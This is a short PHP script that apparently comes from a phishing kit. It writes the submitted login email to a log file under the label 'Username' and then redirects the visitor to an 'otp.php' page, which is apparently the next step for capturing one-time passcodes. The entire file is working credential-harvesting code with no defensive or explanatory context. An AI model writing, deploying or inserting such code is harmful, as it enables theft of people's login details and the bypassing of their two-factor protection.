<?php

    file_put_contents("log.txt", "Username: " . $_POST['login_email'] . " ", FILE_APPEND);
header('Location: otp.php');
exit();
